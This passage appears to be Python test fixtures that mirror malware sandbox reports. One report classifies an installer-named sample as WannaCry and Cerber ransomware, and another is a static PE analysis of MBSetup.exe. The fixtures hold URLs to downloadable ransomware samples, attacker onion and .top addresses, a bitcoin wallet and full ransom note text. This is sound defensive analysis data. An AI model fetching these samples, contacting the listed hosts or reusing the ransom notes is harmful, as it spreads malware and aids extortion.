            "resource": "win11-20240802-en",
            "os": "windows11-21h2-x64",
            "timeout": 600,
            "sigs": 47,
        },
        {"sample": "240828-btyyeszang", "kind": "static", "name": "static1", "status": "reported", "score": 1},
    ],
    "analysis": {
        "score": 10,
        "family": ["wannacry", "cerber"],
        "tags": [
            "family:cerber",
            "family:wannacry",
            "",
            "defense_evasion",
            "discovery",
            "evasion",
            "execution",
            "impact",
            "persistence",
            "privilege_escalation",
            "ransomware",
            "spyware",
            "stealer",
            "worm",
        ],
    },
    "targets": [
        {
            "tasks": ["behavioral1", "behavioral2", "behavioral3"],
            "score": 10,
            "target": "python-3.12.5-amd64.exe",
            "size": 26508648,
            "md5": "bbcb2fcf9d739f776fb6414afc12c80d",
            "sha1": "2d78877db5a8da134ab54ed952b961a7e750ec7d",
            "sha256": "44810512af577ca70b3269b8570b10825ec2ace2b86e4297e767a0f4c0ee8bfd",
            "sha512": "0572c6345f6a4f7f3e5c2ff858e3ca7ca54ae4478f3d59d8e18cb0f596e61dcf12aef579db229e83d63b30f15d6684ee6bb3feaea9413e5e636a503933057678",
            "ssdeep": "786432:jKEO2c6viGKJXI95MB6K3qtY9a3YiVTfwtzWo2CB8:XHiRuVKCY9a3YiRws6B8",
            "tags": [
                "discovery",
                "family:wannacry",
                "",
                "defense_evasion",
                "execution",
                "impact",
                "persistence",
                "ransomware",
                "spyware",
                "stealer",
                "worm",
                "family:cerber",
                "evasion",
                "privilege_escalation",
            ],
            "family": ["wannacry", "cerber"],
            "signatures": [
                {
                    "label": "cerber",
                    "name": "Cerber",
                    "score": 10,
                    "tags": ["ransomware", "family:cerber"],
                    "desc": "Cerber is a widely used ransomware-as-a-service (RaaS), first seen in 2017.",
                },
                {
                    "label": "wannacry",
                    "name": "Wannacry",
                    "score": 10,
                    "tags": ["ransomware", "worm", "family:wannacry"],
                    "desc": "WannaCry is a ransomware cryptoworm.",
                },
                {
                    "label": "deletes_shadows",
                    "name": "Deletes shadow copies",
                    "score": 9,
                    "ttp": ["T1070.004", "T1490", "T1047"],
                    "tags": ["ransomware", "defense_evasion", "impact", "execution", ""],
                    "desc": "Ransomware often targets backup files to inhibit system recovery.",
                },
                {
                    "label": "many_ips",
                    "name": "Contacts a large (1145) amount of remote hosts",
                    "score": 8,
                    "ttp": ["T1046"],
                    "tags": ["discovery"],
                    "desc": "This may indicate a network scan to discover remotely running services.",
                },
                {"label": "fw_startup_file", "name": "Drops startup file", "score": 7},
                {
                    "label": "file_permission_mod",
                    "name": "Modifies file permissions",
                    "score": 7,
                    "ttp": ["T1222"],
                    "tags": ["discovery"],
                },
                {
                    "label": "browser_user_data_harvesting",
                    "name": "Reads user/profile data of web browsers",
                    "score": 7,
                    "ttp": ["T1005", "T1552.001"],
                    "tags": ["spyware", "stealer"],
                    "desc": "Infostealers often target stored browser data, which can include saved credentials etc.",
                },
                {
                    "label": "uses_vbs_compiler",
                    "name": "Uses the VBS compiler for execution",
                    "score": 7,
                    "ttp": ["T1064"],
                },
                {
                    "label": "creates_runkey_registry",
                    "name": "Adds Run key to start application",
                    "score": 6,
                    "ttp": ["T1547.001", "T1112"],
                    "tags": ["persistence"],
                },
                {"label": "download_pe", "name": "Downloads MZ/PE file", "score": 6},
                {"label": "fw_desktop_ini", "name": "Drops desktop.ini file(s)", "score": 6},
                {
                    "label": "win_file_dir_permission",
                    "name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
                    "score": 6,
                    "ttp": ["T1222.001"],
                    "tags": ["defense_evasion"],
                },
                {
                    "label": "susp_dom_as_c2",
                    "name": "Legitimate hosting services abused for malware hosting/C2",
                    "score": 6,
                    "ttp": ["T1102"],
                },
                {
                    "label": "modifies_windows_firewall",
                    "name": "Modifies Windows Firewall",
                    "score": 6,
                    "ttp": ["T1543.003", "T1562.004"],
                    "tags": ["evasion"],
                },
                {"label": "fw_system32", "name": "Drops file in System32 directory", "score": 5},
                {
                    "label": "changes_wallpaper_reg",
                    "name": "Sets desktop wallpaper using registry",
                    "score": 5,
                    "ttp": ["T1491", "T1112"],
                    "tags": ["ransomware"],
                },
                {"name": "Suspicious use of SetThreadContext", "score": 5},
                {
                    "label": "checks_uninstall_regkeys",
                    "name": "Checks installed software on the system",
                    "score": 4,
                    "ttp": ["T1012"],
                    "tags": ["discovery"],
                    "desc": "Looks up Uninstall key entries in the registry to enumerate software on the system.",
                },
                {"label": "fw_programfiles", "name": "Drops file in Program Files directory", "score": 4},
                {"label": "fw_windows", "name": "Drops file in Windows directory", "score": 4},
                {"name": "Executes dropped EXE", "score": 4},
                {"name": "Loads dropped DLL", "score": 4},
                {
                    "label": "subvert_trust_controls_motw",
                    "name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
                    "score": 4,
                    "ttp": ["T1553.003"],
                    "tags": ["defense_evasion"],
                    "desc": "When files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named Zone.Identifier with a specific value known as the MOTW.",
                },
                {
                    "label": "browser_information_discovery",
                    "name": "Browser Information Discovery",
                    "score": 3,
                    "ttp": ["T1217"],
                    "tags": ["discovery"],
                    "desc": "Enumerate browser information.",
                },
                {
                    "label": "file_antivm_ide_drive",
                    "name": "Enumerates physical storage devices",
                    "score": 3,
                    "ttp": ["T1082"],
                    "desc": "Attempts to interact with connected storage/optical drive(s).",
                },
                {
                    "label": "netsh_helper_dll",
                    "name": "Event Triggered Execution: Netsh Helper DLL",
                    "score": 3,
                    "ttp": ["T1546.007"],
                    "tags": ["persistence", "privilege_escalation"],
                    "desc": "Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system.",
                },
                {"label": "program_crash", "name": "Program crash", "score": 3},
                {
                    "label": "system_language_discovery",
                    "name": "System Location Discovery: System Language Discovery",
                    "score": 3,
                    "ttp": ["T1614.001"],
                    "tags": ["discovery"],
                    "desc": "Attempt gather information about the system language of a victim in order to infer the geographical location of that host.",
                },
                {
                    "label": "internet_connection_discovery",
                    "name": "System Network Configuration Discovery: Internet Connection Discovery",
                    "score": 3,
                    "ttp": ["T1016.001"],
                    "tags": ["discovery"],
                    "desc": "Adversaries may check for Internet connectivity on compromised systems.",
                },
                {
                    "name": "NSIS installer",
                    "score": 1,
                    "tags": ["installer"],
                    "indicators": [
                        {"resource": "behavioral3/files/0x000100000002af24-4904.dat", "yara_rule": "nsis_installer_1"},
                        {"resource": "behavioral3/files/0x000100000002af24-4904.dat", "yara_rule": "nsis_installer_2"},
                    ],
                },
                {
                    "label": "reg_hw_processor",
                    "name": "Checks processor information in registry",
                    "ttp": ["T1012", "T1082"],
                    "desc": "Processor information is often read in order to detect sandboxing environments.",
                },
                {"label": "reg_hw_system", "name": "Enumerates system info in registry", "ttp": ["T1012", "T1082"]},
                {"label": "taskkill_kill_process", "name": "Kills process with taskkill", "tags": ["evasion"]},
                {
                    "label": "modifies_iexplore_settings",
                    "name": "Modifies Internet Explorer settings",
                    "ttp": ["T1112"],
                    "tags": ["adware", "spyware"],
                },
                {"label": "reg_hku_write", "name": "Modifies data under HKEY_USERS"},
                {"label": "reg_software_classes", "name": "Modifies registry class"},
                {"label": "reg_modifies_key", "name": "Modifies registry key", "ttp": ["T1112"]},
                {"label": "ntfs_ads", "name": "NTFS ADS"},
                {
                    "label": "notepad_open",
                    "name": "Opens file in notepad (likely ransom note)",
                    "tags": ["ransomware"],
                },
                {"label": "ping_generic", "name": "Runs ping.exe", "ttp": ["T1018"]},
                {"name": "Suspicious behavior: EnumeratesProcesses"},
                {"name": "Suspicious behavior: NtCreateUserProcessBlockNonMicrosoftBinary"},
                {"name": "Suspicious use of AdjustPrivilegeToken"},
                {"name": "Suspicious use of FindShellTrayWindow"},
                {"name": "Suspicious use of SendNotifyMessage"},
                {"name": "Suspicious use of SetWindowsHookEx"},
                {"name": "Suspicious use of WriteProcessMemory"},
                {
                    "label": "win_tasksched_com_clsid",
                    "name": "Uses Task Scheduler COM API",
                    "ttp": ["T1012"],
                    "tags": ["persistence"],
                    "desc": "The Task Scheduler COM API can be used to schedule applications to run on boot or at set times.",
                },
                {
                    "label": "win_volshadow_com_clsid",
                    "name": "Uses Volume Shadow Copy service COM API",
                    "tags": ["ransomware"],
                    "desc": "The Volume Shadow Copy service is used to manage backups/snapshots.",
                },
                {
                    "label": "attrib_generic",
                    "name": "Views/modifies file attributes",
                    "ttp": ["T1564.001"],
                    "tags": ["evasion"],
                },
            ],
            "iocs": {
                "urls": [
                    "https://www.google.com/search?client=firefox-b-d&q=wanacry+ransowmare+odwnload",
                    "https://github.com/kh4sh3i/Ransomware-Samples/latest-commit/main/Thanos",
                    "https://github.com/kh4sh3i/Ransomware-Samples/tree-commit-info/main/Thanos",
                    "https://github.com/kh4sh3i/Ransomware-Samples/deferred-metadata/main/Thanos",
                    "https://github.com/kh4sh3i/Ransomware-Samples/blob/main/Thanos/Ransomware.Thanos.zip",
                    "https://github.com/kh4sh3i/Ransomware-Samples/latest-commit/main/Thanos/Ransomware.Thanos.zip",
                    "https://github.com/kh4sh3i/Ransomware-Samples/deferred-metadata/main/Thanos/Ransomware.Thanos.zip",
                    "https://github.com/kh4sh3i/Ransomware-Samples/raw/main/Thanos/Ransomware.Thanos.zip",
                    "https://github.com/kh4sh3i/Ransomware-Samples/tree/main/WannaCry",
                    "https://github.com/kh4sh3i/Ransomware-Samples/latest-commit/main/WannaCry",
                    "https://github.com/kh4sh3i/Ransomware-Samples/tree-commit-info/main/WannaCry",
                    "https://github.com/kh4sh3i/Ransomware-Samples/deferred-metadata/main/WannaCry",
                    "https://github.com/kh4sh3i/Ransomware-Samples/blob/main/WannaCry/Ransomware.WannaCry.zip",
                    "https://github.com/kh4sh3i/Ransomware-Samples/latest-commit/main/WannaCry/Ransomware.WannaCry.zip",
                    "https://github.com/kh4sh3i/Ransomware-Samples/deferred-metadata/main/WannaCry/Ransomware.WannaCry.zip",
                    "https://github.com/kh4sh3i/Ransomware-Samples/raw/main/WannaCry/Ransomware.WannaCry.zip",
                    "https://tse1.mm.bing.net/th?&id=OVP.J9EM7WCo2Pm6ijrc4rhPDwHgFo&w=197&h=110&c=7&pid=1.7&rs=1",
                    "https://tse1.mm.bing.net/th?&id=OVP.EH7wyfxPw7iIj6_KN69X2wHgFo&w=197&h=110&c=7&pid=1.7&rs=1",
                    "https://tse1.mm.bing.net/th?&id=OVP.BMblSoYDADiCRLKtOracbwEsDh&w=197&h=110&c=7&pid=1.7&rs=1",
                ],
                "domains": [
                    "prod.content-signature-chains.prod.webservices.mozgcp.net",
                    "www.totalav.com",
                    "widget.trustpilot.com",
                    "url.totalav.com",
                    "x.ss2.us",
                    "92.47.111.34.in-addr.arpa",
                    "66.148.165.3.in-addr.arpa",
                    "www2.bing.com",
                    "104.149.172.185.in-addr.arpa",
                    "ocsp.comodoca.com",
                    "90.74.224.35.in-addr.arpa",
                    "install.protected.net",
                    "226.20.18.104.in-addr.arpa",
                    "81.81.224.13.in-addr.arpa",
                    "download.totalav.com",
                    "ocsp.globalsign.com",
                    "ocsp.usertrust.com",
                    "23.149.64.172.in-addr.arpa",
                    "arm-ring.msedge.net",
                    "fp-vs-nocache.azureedge.net",
                    "254.6.107.13.in-addr.arpa",
                    "254.240.150.4.in-addr.arpa",
                    "161.19.199.152.in-addr.arpa",
                ],
                "ips": [
                    "8.8.8.8",
                    "116.202.120.165",
                    "31.31.78.49",
                    "128.31.0.39",
                    "204.8.156.142",
                    "213.61.66.118",
                    "51.68.185.82",
                    "88.221.135.33",
                    "95.101.143.219",
                    "34.111.47.92",
                    "3.165.148.66",
                    "35.224.74.90",
                    "185.172.149.104",
                    "4.150.240.254",
                    "152.199.19.161",
                ],
            },
        }
    ],
    "signatures": [
        {
            "label": "cerber",
            "name": "Cerber",
            "score": 10,
            "tags": ["ransomware", "family:cerber"],
            "desc": "Cerber is a widely used ransomware-as-a-service (RaaS), first seen in 2017.",
        },
        {
            "label": "wannacry",
            "name": "Wannacry",
            "score": 10,
            "tags": ["ransomware", "worm", "family:wannacry"],
            "desc": "WannaCry is a ransomware cryptoworm.",
        },
        {
            "label": "deletes_shadows",
            "name": "Deletes shadow copies",
            "score": 9,
            "ttp": ["T1070.004", "T1490", "T1047"],
            "tags": ["ransomware", "defense_evasion", "impact", "execution", ""],
            "desc": "Ransomware often targets backup files to inhibit system recovery.",
        },
        {
            "label": "many_ips",
            "name": "Contacts a large (1145) amount of remote hosts",
            "score": 8,
            "ttp": ["T1046"],
            "tags": ["discovery"],
            "desc": "This may indicate a network scan to discover remotely running services.",
        },
        {"label": "fw_startup_file", "name": "Drops startup file", "score": 7},
        {
            "label": "file_permission_mod",
            "name": "Modifies file permissions",
            "score": 7,
            "ttp": ["T1222"],
            "tags": ["discovery"],
        },
        {
            "label": "browser_user_data_harvesting",
            "name": "Reads user/profile data of web browsers",
            "score": 7,
            "ttp": ["T1005", "T1552.001"],
            "tags": ["spyware", "stealer"],
            "desc": "Infostealers often target stored browser data, which can include saved credentials etc.",
        },
        {"label": "uses_vbs_compiler", "name": "Uses the VBS compiler for execution", "score": 7, "ttp": ["T1064"]},
        {
            "label": "creates_runkey_registry",
            "name": "Adds Run key to start application",
            "score": 6,
            "ttp": ["T1547.001", "T1112"],
            "tags": ["persistence"],
        },
        {"label": "download_pe", "name": "Downloads MZ/PE file", "score": 6},
        {"label": "fw_desktop_ini", "name": "Drops desktop.ini file(s)", "score": 6},
        {
            "label": "win_file_dir_permission",
            "name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
            "score": 6,
            "ttp": ["T1222.001"],
            "tags": ["defense_evasion"],
        },
        {
            "label": "susp_dom_as_c2",
            "name": "Legitimate hosting services abused for malware hosting/C2",
            "score": 6,
            "ttp": ["T1102"],
        },
        {
            "label": "modifies_windows_firewall",
            "name": "Modifies Windows Firewall",
            "score": 6,
            "ttp": ["T1543.003", "T1562.004"],
            "tags": ["evasion"],
        },
        {"label": "fw_system32", "name": "Drops file in System32 directory", "score": 5},
        {
            "label": "changes_wallpaper_reg",
            "name": "Sets desktop wallpaper using registry",
            "score": 5,
            "ttp": ["T1491", "T1112"],
            "tags": ["ransomware"],
        },
        {"name": "Suspicious use of SetThreadContext", "score": 5},
        {
            "label": "checks_uninstall_regkeys",
            "name": "Checks installed software on the system",
            "score": 4,
            "ttp": ["T1012"],
            "tags": ["discovery"],
            "desc": "Looks up Uninstall key entries in the registry to enumerate software on the system.",
        },
        {"label": "fw_programfiles", "name": "Drops file in Program Files directory", "score": 4},
        {"label": "fw_windows", "name": "Drops file in Windows directory", "score": 4},
        {"name": "Executes dropped EXE", "score": 4},
        {"name": "Loads dropped DLL", "score": 4},
        {
            "label": "subvert_trust_controls_motw",
            "name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
            "score": 4,
            "ttp": ["T1553.003"],
            "tags": ["defense_evasion"],
            "desc": "When files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named Zone.Identifier with a specific value known as the MOTW.",
        },
        {
            "label": "browser_information_discovery",
            "name": "Browser Information Discovery",
            "score": 3,
            "ttp": ["T1217"],
            "tags": ["discovery"],
            "desc": "Enumerate browser information.",
        },
        {
            "label": "file_antivm_ide_drive",
            "name": "Enumerates physical storage devices",
            "score": 3,
            "ttp": ["T1082"],
            "desc": "Attempts to interact with connected storage/optical drive(s).",
        },
        {
            "label": "netsh_helper_dll",
            "name": "Event Triggered Execution: Netsh Helper DLL",
            "score": 3,
            "ttp": ["T1546.007"],
            "tags": ["persistence", "privilege_escalation"],
            "desc": "Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system.",
        },
        {"label": "program_crash", "name": "Program crash", "score": 3},
        {
            "label": "system_language_discovery",
            "name": "System Location Discovery: System Language Discovery",
            "score": 3,
            "ttp": ["T1614.001"],
            "tags": ["discovery"],
            "desc": "Attempt gather information about the system language of a victim in order to infer the geographical location of that host.",
        },
        {
            "label": "internet_connection_discovery",
            "name": "System Network Configuration Discovery: Internet Connection Discovery",
            "score": 3,
            "ttp": ["T1016.001"],
            "tags": ["discovery"],
            "desc": "Adversaries may check for Internet connectivity on compromised systems.",
        },
        {
            "name": "NSIS installer",
            "score": 1,
            "tags": ["installer"],
            "indicators": [
                {"resource": "behavioral3/files/0x000100000002af24-4904.dat", "yara_rule": "nsis_installer_1"},
                {"resource": "behavioral3/files/0x000100000002af24-4904.dat", "yara_rule": "nsis_installer_2"},
            ],
        },
        {
            "label": "reg_hw_processor",
            "name": "Checks processor information in registry",
            "ttp": ["T1012", "T1082"],
            "desc": "Processor information is often read in order to detect sandboxing environments.",
        },
        {"label": "reg_hw_system", "name": "Enumerates system info in registry", "ttp": ["T1012", "T1082"]},
        {"label": "taskkill_kill_process", "name": "Kills process with taskkill", "tags": ["evasion"]},
        {
            "label": "modifies_iexplore_settings",
            "name": "Modifies Internet Explorer settings",
            "ttp": ["T1112"],
            "tags": ["adware", "spyware"],
        },
        {"label": "reg_hku_write", "name": "Modifies data under HKEY_USERS"},
        {"label": "reg_software_classes", "name": "Modifies registry class"},
        {"label": "reg_modifies_key", "name": "Modifies registry key", "ttp": ["T1112"]},
        {"label": "ntfs_ads", "name": "NTFS ADS"},
        {"label": "notepad_open", "name": "Opens file in notepad (likely ransom note)", "tags": ["ransomware"]},
        {"label": "ping_generic", "name": "Runs ping.exe", "ttp": ["T1018"]},
        {"name": "Suspicious behavior: EnumeratesProcesses"},
        {"name": "Suspicious behavior: NtCreateUserProcessBlockNonMicrosoftBinary"},
        {"name": "Suspicious use of AdjustPrivilegeToken"},
        {"name": "Suspicious use of FindShellTrayWindow"},
        {"name": "Suspicious use of SendNotifyMessage"},
        {"name": "Suspicious use of SetWindowsHookEx"},
        {"name": "Suspicious use of WriteProcessMemory"},
        {
            "label": "win_tasksched_com_clsid",
            "name": "Uses Task Scheduler COM API",
            "ttp": ["T1012"],
            "tags": ["persistence"],
            "desc": "The Task Scheduler COM API can be used to schedule applications to run on boot or at set times.",
        },
        {
            "label": "win_volshadow_com_clsid",
            "name": "Uses Volume Shadow Copy service COM API",
            "tags": ["ransomware"],
            "desc": "The Volume Shadow Copy service is used to manage backups/snapshots.",
        },
        {
            "label": "attrib_generic",
            "name": "Views/modifies file attributes",
            "ttp": ["T1564.001"],
            "tags": ["evasion"],
        },
    ],
    "extracted": [
        {
            "tasks": ["behavioral2", "behavioral3"],
            "resource": "behavioral2/files/0x0007000000023651-708.dat",
            "path": "C:\\Users\\Admin\\Downloads\\@Please_Read_Me@.txt",
            "ransom_note": {
                "family": "wannacry",
                "wallets": ["12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw"],
                "note": "Q:  What's wrong with my files?\r\n\r\nA:  Ooops, your important files are encrypted. It means you will not be able to access them anymore until they are decrypted.\r\n    If you follow our instructions, we guarantee that you can decrypt all your files quickly and safely!\r\n    Let's start decrypting!\r\n\r\nQ:  What do I do?\r\n\r\nA:  First, you need to pay service fees for the decryption.\r\n    Please send $300 worth of bitcoin to this bitcoin address: 12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw\r\n\r\n    Next, please find an application file named \"@WanaDecryptor@.exe\". It is the decrypt software.\r\n    Run and follow the instructions! (You may need to disable your antivirus for a while.)\r\n    \r\nQ:  How can I trust?\r\n\r\nA:  Don't worry about decryption.\r\n    We will decrypt your files surely because nobody will trust us if we cheat users.\r\n    \r\n\r\n*   If you need our assistance, send a message by clicking <Contact Us> on the decryptor window.\r\n\u0000",
            },
        },
        {
            "tasks": ["behavioral3"],
            "resource": "behavioral3/files/0x000100000002acb9-1563.dat",
            "path": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Office\\OTele\\_R_E_A_D___T_H_I_S___MUA3_.txt",
            "ransom_note": {
                "family": "cerber",
                "urls": [
                    "http://p27dokhpz2n7nvgr.onion/6C8D-FEB3-7865-0446-9329",
                    "http://p27dokhpz2n7nvgr.12hygy.top/6C8D-FEB3-7865-0446-9329",
                    "http://p27dokhpz2n7nvgr.14ewqv.top/6C8D-FEB3-7865-0446-9329",
                    "http://p27dokhpz2n7nvgr.14vvrc.top/6C8D-FEB3-7865-0446-9329",
                    "http://p27dokhpz2n7nvgr.129p1t.top/6C8D-FEB3-7865-0446-9329",
                    "http://p27dokhpz2n7nvgr.1apgrn.top/6C8D-FEB3-7865-0446-9329",
                ],
                "note": ' \r\n CERBER RANSOMWARE\r\n \r\n -----\r\n \r\n YOUR DOCUMENTS, PH0TOS, DATABASES AND OTHER IMPORTANT FILES HAVE BEEN ENCRYPTED!\r\n \r\n -----\r\n \r\n The only way to decrypt y0ur files is to receive the private key and decryption program.\r\n \r\n To receive the private key and decryption program go to any decrypted folder, \r\n inside there is the special file (*_READ_THIS_FILE_*) with complete instructions \r\n how to decrypt your files.\r\n \r\n If you cannot find any (*_READ_THIS_FILE_*) file at your PC, follow the instructions below:\r\n \r\n -----\r\n \r\n 1. Download "Tor Browser" from https://www.torproject.org/ and install it.\r\n \r\n 2. In the "Tor Browser" open your personal page here:\r\n \r\n http://p27dokhpz2n7nvgr.onion/6C8D-FEB3-7865-0446-9329\r\n \r\n Note! This page is available via "Tor Browser" only.\r\n \r\n -----\r\n \r\n Also you can use temporary addresses on your personal page without using "Tor Browser".\r\n \r\n -----\r\n \r\n 1. http://p27dokhpz2n7nvgr.12hygy.top/6C8D-FEB3-7865-0446-9329\r\n \r\n 2. http://p27dokhpz2n7nvgr.14ewqv.top/6C8D-FEB3-7865-0446-9329\r\n \r\n 3. http://p27dokhpz2n7nvgr.14vvrc.top/6C8D-FEB3-7865-0446-9329\r\n \r\n 4. http://p27dokhpz2n7nvgr.129p1t.top/6C8D-FEB3-7865-0446-9329\r\n \r\n 5. http://p27dokhpz2n7nvgr.1apgrn.top/6C8D-FEB3-7865-0446-9329\r\n \r\n -----\r\n \r\n Note! These are temporary addresses! They will be available for a limited amount of time!\r\n \r\n -----\r\n ',
            },
        },
        {
            "tasks": ["behavioral3"],
            "resource": "behavioral3/files/0x000100000002acba-1560.dat",
            "path": "C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\OneNote\\16.0\\_R_E_A_D___T_H_I_S___3UEEQ5V_.hta",
            "ransom_note": {
                "family": "cerber",
            },
        },
    ],
}

query_240908_tpps3axgmd_static = {
    "version": "0.2",
    "sample": {"sample": "240908-tpps3axgmd", "kind": "file", "size": 2591728, "target": "MBSetup.exe"},
    "task": {"task": "240908-tpps3axgmd-static1", "target": "MBSetup.exe"},
    "analysis": {"reported": "2024-09-08T16:14:11Z", "score": 1},
    "files": [
        {
            "filename": "MBSetup.exe",
            "filesize": 2591728,
            "md5": "8611a0d47266ce8d473d540bd6534ffc",
            "sha1": "8804544c8ac023d89783d3d27b8c00b11dd8cbb4",
            "sha256": "a573205f27cd8a421e33322a41037ddf74d4f9cedc574c86dea6550a8f065143",
            "sha512": "8f4291ebb1b8cb5561b857d3ea2418c503f79b37b201f017d04a3c49746bfdc29abad5cfef3f2ce150fa8163824ac0a649a24386aee4562940d394f6514e4b7c",
            "ssdeep": "49152:OE8I6oEK7uzgRTvnFjStQyfvE0Z3R0nxiIq2dseYGfXH:OE8IjzuzgFt7KtQRq2VXH",
            "exts": [".exe"],
            "tags": ["windows:6", "windows", "x86", "arch:x86"],
            "depth": 0,
            "kind": "file",
            "selected": True,
            "runas": "MBSetup.exe",
            "metadata": {
                "pe": {
                    "timestamp": 1719498863,
                    "imports": [
                        {
                            "dll_name": "kernel32",
                            "imports": [
                                "LeaveCriticalSection",
                                "RaiseException",
                                "EnterCriticalSection",
                                "GetLastError",
                                "MultiByteToWideChar",
                                "SizeofResource",
                                "LoadResource",
                                "FindResourceW",
                                "LoadLibraryExW",
                                "GetModuleFileNameW",
                                "InitializeCriticalSectionEx",
                                "DeleteCriticalSection",
                                "IsWow64Process",
                                "GetCurrentProcess",
                                "VerifyVersionInfoW",
                                "VerSetConditionMask",
                                "GetSystemDirectoryW",
                                "CreateFileW",
                                "DeviceIoControl",
                                "CloseHandle",
                                "GetCurrentThreadId",
                                "SetLastError",
                                "Sleep",
                                "DeleteFileW",
                                "GlobalFree",
                                "LockResource",
                                "FindResourceExW",
                                "LocalFree",
                                "FormatMessageW",
                                "LocalAlloc",
                                "CallNamedPipeW",
                                "GetWindowsDirectoryW",
                                "SetCurrentDirectoryW",
                                "GetCommandLineW",
                                "lstrcmpiW",
                                "CreateMutexW",
                                "GetNativeSystemInfo",
                                "GetDiskFreeSpaceExW",
                                "FindFirstFileW",
                                "FindClose",
                                "CreateProcessW",
                                "FindNextFileW",
                                "WideCharToMultiByte",
                                "GlobalAlloc",
                                "GlobalLock",
                                "SetThreadUILanguage",
                                "LoadLibraryW",
                                "CreateDirectoryW",
                                "GetLogicalDrives",
                                "GetTempPathW",
                                "MoveFileExW",
                                "InitializeProcThreadAttributeList",
                                "UpdateProcThreadAttribute",
                                "DeleteProcThreadAttributeList",
                                "OpenProcess",
                                "ResumeThread",
                                "TerminateProcess",
                                "CreateToolhelp32Snapshot",
                                "Process32FirstW",
                                "Process32NextW",
                                "K32GetModuleFileNameExW",
                                "GetCurrentDirectoryW",
                                "GetCurrentProcessId",
                                "GetModuleFileNameA",
                                "OutputDebugStringW",
                                "SetEndOfFile",
                                "WriteConsoleW",
                                "SetStdHandle",
                                "GetProcAddress",
                                "GetModuleHandleW",
                                "FreeLibrary",
                                "GetProcessHeap",
                                "HeapAlloc",
                                "HeapFree",
                                "HeapReAlloc",
                                "HeapSize",
                                "HeapDestroy",
                                "DecodePointer",
                                "MulDiv",
                                "SetEnvironmentVariableW",
                                "FreeEnvironmentStringsW",
                                "GetEnvironmentStringsW",
                                "GetOEMCP",
                                "GetACP",
                                "IsValidCodePage",
                                "GetTimeZoneInformation",
                                "ReadConsoleW",
                                "EnumSystemLocalesW",
                                "GetUserDefaultLCID",
                                "IsValidLocale",
                                "GetTimeFormatW",
                                "GetSystemInfo",
                                "VirtualProtect",
                                "VirtualQuery",
                                "LoadLibraryExA",
                                "GetStringTypeW",
                                "FindFirstFileExW",
                                "GetFileAttributesW",
                                "GetFileAttributesExW",
                                "GetFileInformationByHandle",
                                "RemoveDirectoryW",
                                "AreFileApisANSI",
                                "CopyFileW",
                                "DuplicateHandle",
                                "WaitForSingleObjectEx",
                                "SwitchToThread",
                                "GetCurrentThread",
                                "QueryPerformanceCounter",
                                "TryEnterCriticalSection",
                                "EncodePointer",
                                "InitializeCriticalSectionAndSpinCount",
                                "CreateEventW",
                                "TlsAlloc",
                                "TlsGetValue",
                                "TlsSetValue",
                                "TlsFree",
                                "GetSystemTimeAsFileTime",
                                "GetTickCount",
                                "CompareStringW",
                                "LCMapStringW",
                                "GetLocaleInfoW",
                                "GetCPInfo",
                                "IsDebuggerPresent",
                                "InitializeSListHead",
                                "InterlockedPopEntrySList",
                                "InterlockedPushEntrySList",
                                "FlushInstructionCache",
                                "IsProcessorFeaturePresent",
                                "VirtualAlloc",
                                "VirtualFree",
                                "SetEvent",
                                "ResetEvent",
                                "UnhandledExceptionFilter",
                                "SetUnhandledExceptionFilter",
                                "GetStartupInfoW",
                                "CreateTimerQueue",
                                "SignalObjectAndWait",
                                "CreateThread",
                                "SetThreadPriority",
                                "GetThreadPriority",
                                "GetLogicalProcessorInformation",
                                "CreateTimerQueueTimer",
                                "ChangeTimerQueueTimer",
                                "DeleteTimerQueueTimer",
                                "GetNumaHighestNodeNumber",
                                "GetProcessAffinityMask",
                                "SetThreadAffinityMask",
                                "RegisterWaitForSingleObject",
                                "UnregisterWait",
                                "GetThreadTimes",
                                "FreeLibraryAndExitThread",
                                "GetModuleHandleA",
                                "GetVersionExW",
                                "ReleaseSemaphore",
                                "InterlockedFlushSList",
                                "QueryDepthSList",
                                "UnregisterWaitEx",
                                "RtlUnwind",
                                "ExitProcess",
                                "GetModuleHandleExW",
                                "GetCommandLineA",
                                "ExitThread",
                                "GetStdHandle",
                                "WriteFile",
                                "GetFileType",
                                "FlushFileBuffers",
                                "GetConsoleCP",
                                "GetConsoleMode",
                                "ReadFile",
                                "SetFilePointerEx",
                                "GetFileSizeEx",
                                "GetDateFormatW",
                            ],
                        },
                        {"dll_name": "dwmapi", "imports": ["DwmGetWindowAttribute"]},
                        {
                            "dll_name": "crypt32",
                            "imports": [
                                "CryptMsgClose",
                                "CertCloseStore",
                                "CertFreeCertificateContext",
                                "CertGetNameStringW",
                                "CertFindCertificateInStore",
                                "CryptMsgGetParam",
                                "CryptQueryObject",
                            ],
                        },
                        {"dll_name": "rpcrt4", "imports": ["UuidToStringW", "RpcStringFreeW", "UuidCreate"]},
                    ],
                    "sections": [
                        {
                            "name": ".text",
                            "offset": 1024,
                            "virtual_size": 750918,
                            "size": 751104,
                            "characteristics": ["IMAGE_SCN_CNT_CODE", "IMAGE_SCN_MEM_EXECUTE", "IMAGE_SCN_MEM_READ"],
                        },
                        {
                            "name": ".rdata",
                            "offset": 752128,
                            "virtual_size": 185064,
                            "size": 185344,
                            "characteristics": ["IMAGE_SCN_CNT_INITIALIZED_DATA", "IMAGE_SCN_MEM_READ"],
                        },
                        {
                            "name": ".data",
                            "offset": 937472,
                            "virtual_size": 23516,
                            "size": 17920,
                            "characteristics": [
                                "IMAGE_SCN_CNT_INITIALIZED_DATA",
                                "IMAGE_SCN_MEM_READ",
                                "IMAGE_SCN_MEM_WRITE",
                            ],
                        },
                        {
                            "name": ".rsrc",
                            "offset": 955392,
                            "virtual_size": 1544624,
                            "size": 1544704,
                            "characteristics": ["IMAGE_SCN_CNT_INITIALIZED_DATA", "IMAGE_SCN_MEM_READ"],
                        },
                        {
                            "name": ".reloc",
                            "offset": 2500096,
                            "virtual_size": 43700,
                            "size": 44032,
                            "characteristics": [
